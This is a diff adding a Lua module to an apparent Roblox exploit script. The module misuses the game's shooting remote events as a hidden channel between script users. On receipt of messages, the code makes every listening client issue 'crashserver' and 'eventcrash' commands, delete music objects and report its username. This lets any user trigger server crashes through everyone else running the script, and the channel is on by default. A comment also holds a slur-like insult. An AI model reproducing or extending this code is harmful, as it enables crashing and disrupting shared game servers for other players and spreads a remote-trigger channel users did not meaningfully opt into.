@@ -1,0 +1,79 @@
+--This script synchronizes with other users to make commands more effective
+--Dont try abusing this API you stupid nickger
+--Feel free to synchronize with my script if you are a script creator
+--To disable this, simply goto the settings page and turn "SyncWithUsers" off
+local N,M,G = ...
+local Notif = _G.TopBarNotif
+local SyncWithUsers = true
+local Cool = nil
+local API = {
+	Send = function(a)
+		local events = {}
+		for i = 1,#a do
+			table.insert(events,{
+				Cframe = CFrame.new(0,0,0),
+				Distance = 0,
+				B = a[i]
+			})
+		end
+		local gun = M("M9")
+		game:GetService("ReplicatedStorage").ShootEvent:FireServer(events,gun)
+		game:GetService("ReplicatedStorage").ReloadEvent:FireServer(gun)
+	end,
+	Off = function()
+		SyncWithUsers = nil
+		return "Off"
+	end,
+	On = function()
+		SyncWithUsers = true
+		return "On"
+	end,
+}
+local Players = game:GetService("Players")
+G.PAUsers = Players.LocalPlayer.Name
+local ReplEvent = game:GetService("ReplicatedStorage"):WaitForChild("ReplicateEvent",8)
+if ReplEvent then
+	G.Users_Sync=ReplEvent.OnClientEvent:Connect(function(a)
+		if SyncWithUsers and a[1] and a[1].B then
+			local b = a[1].B
+			if not Cool then
+				Cool = true
+				task.delay(1.5,function()
+					Cool = nil
+				end)
+				if b=="PlayMusic" then
+					game.Players:Chat(N.."music "..a[2].B.." _synced")
+				end
+				if b=="StopMusic" then
+					for i,v in pairs(workspace:GetChildren()) do
+						if v.Name=="Playing Music" then
+							v:Destroy()
+							Notif("Music was Stopped By Another User. | Goto settings to disable this.",8)
+						end
+					end
+				end
+				if b=="Crash" then
+					game.Players:Chat(N.."crashserver")
+				end
+				if b=="Ecrash" then
+					game.Players:Chat(N.."eventcrash")
+				end
+				if b=="GetUser_PissAdmin" then
+					API.Send({"GetUser_Confirm",game.Players.LocalPlayer.Name})
+				end
+			end
+			if b=="GetUser_Confirm" and G.GettingUsers and a[2].B then
+				local plr = Players:FindFirstChild(a[2].B)
+				if plr then
+					G.PAUsers = G.PAUsers..", "..plr.Name
+				end
+			end
+		end
+	end)
+end
+--[[
+    local API = (Source)
+    API.Send({"PlayMusic","music id here"})
+    API.Send({"GetUser_PissAdmin"})
+]] 
+return API
